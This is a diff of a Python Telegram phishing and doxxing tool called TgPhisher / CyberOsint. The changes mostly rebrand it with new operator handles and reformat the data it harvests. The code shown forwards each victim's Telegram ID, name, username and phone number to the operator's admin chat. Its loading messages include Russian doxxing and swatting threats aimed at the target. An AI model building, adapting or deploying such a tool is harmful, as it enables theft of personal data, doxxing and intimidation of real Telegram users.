@@ -31,7 +31,7 @@ BANNER = f"""
                 ╚██████╔╝███████║██║██║ ╚████║   ██║   
                  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
 
-                       {Fore.BLUE}::Telegram - {Fore.RED}@CYB3R_ST4LK3R::                                      
+                       {Fore.BLUE}::Telegram - {Fore.RED}@Y0urAdm1n::                                      
 """
 
 MENU = f"""
@@ -204,7 +204,7 @@ def animated_print(text, speed=0.05):
     print()  # Для новой строки после завершения анимации
 
 def loading_animation(duration=5):
-    symbols = " error error error                ", "error                ", "proxit?           ","Fight demons          ","D3mons F1ght         ", "CyberStalker               ", "CyberOsint       ", "By Cyber Stalker        ", "By Luka ", "Dox Me..    ", "▓▓Load?▓▓▓▓         ", "Loading?        ", "Wha..ЧТо?         ", "CyberOsint        ", "ʇuısoɹǝqʎɔ       ", " ", "DOXXED BY...      ""Жди сват       ", "Задоксь меня               ", "Попробуй найди меня           ", "опера уже едут              ", "Otrabov?          ", "Жди докс сука            ", "Последний понедельник живешь!      " #"|/-\\"
+    symbols = "YourAdmin             ", " error error error                ", "error                ", "proxit?           ","Fight demons          ","D3mons F1ght         ", "CyberStalker               ", "CyberOsint       ", "By Cyber Stalker        ", "By Luka ", "Dox Me..    ", "▓▓Load?▓▓▓▓         ", "Loading?        ", "Wha..ЧТо?         ", "CyberOsint        ", "ʇuısoɹǝqʎɔ       ", " ", "DOXXED BY...      ""Жди сват       ", "Задоксь меня               ", "Попробуй найди меня           ", "опера уже едут              ", "Otrabov?          ", "Жди докс сука            ", "Последний понедельник живешь!      " #"|/-\\"
     end_time = time.time() + duration
     while time.time() < end_time:
         for symbol in symbols:
@@ -252,7 +252,7 @@ def tgphisher():
         /____/                                   
 {Style.RESET_ALL}           
                     .:EYE OF GOD:.    
-           {Style.BRIGHT}{Fore.YELLOW}Telegram{Style.RESET_ALL}:{Fore.CYAN} t.me/CYB3R_ST4LK3R
+           {Style.BRIGHT}{Fore.YELLOW}Telegram{Style.RESET_ALL}:{Fore.CYAN} t.me/Y0urAdm1n
      {Style.BRIGHT}{Fore.YELLOW}GitHub{Style.RESET_ALL}:{Fore.CYAN} github.com/TheCyberStalker/TgPhisher
 
       ''')
@@ -321,11 +321,11 @@ def tgphisher():
                     try:
                         bot.send_message(admin_id, f'''
 #TgPhisher - {username}
-#CyberOsint - @cyb3r_st4lk3r 
-- {message.from_user.id}
+#CyberOsint - @Y0urAdm1n
+- id{message.from_user.id}
 - {message.from_user.first_name}
 - {message.from_user.username}
-- {message.contact.phone_number}
+- +{message.contact.phone_number}
 - Попробуй по этим данным совершить поиск в нашем софте или боте!''')
                     except:
                         print('     ошибка отправки на ADMIN_ID      ')
@@ -365,13 +365,13 @@ def main():
                 ██║   ██║╚════██║██║██║╚██╗██║   ██║   
                 ╚██████╔╝███████║██║██║ ╚████║   ██║   
                  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   
-                       ::Telegram - @CYB3R_ST4LK3R::
+                       ::Telegram - @Y0urAdm1n::
                                                            
 """, speed=0.002)
         animated_print(f"\n     С возвращением, {name}!", speed=0.05)
     else:
         name = input(f"Введите ваше имя: ")
-        animated_print('Получите api-key из бота - t.me/CYB3R_ST4LK3R\n ищите пост с гайдом по хештегу #TokenCO', speed=0.05)
+        animated_print('Получите api-key из бота - @CyberOsintSoftBot\n не забудьте ознакомиться с мануалом на канале', speed=0.05)
         token = input(f"Введите ваш токен: ")
         config['name'] = name
         config['token'] = token
